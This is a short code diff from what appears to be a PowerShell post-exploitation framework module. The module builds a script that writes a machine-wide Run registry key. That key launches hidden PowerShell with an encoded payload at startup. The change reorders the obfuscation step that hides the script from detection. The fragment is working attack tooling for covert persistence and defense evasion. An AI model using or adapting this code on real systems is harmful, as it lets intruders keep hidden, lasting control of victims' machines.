@@ -243,7 +243,9 @@ class Module(object):
         script += "$null=Set-ItemProperty -Force -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name " + keyName + " -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=" + locationString + ";powershell -Win Hidden -enc $x\"';"
         
         script += "'Registry persistence established " + statusMsg + "'"
-        script = helpers.keyword_obfuscation(script)
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
         return script
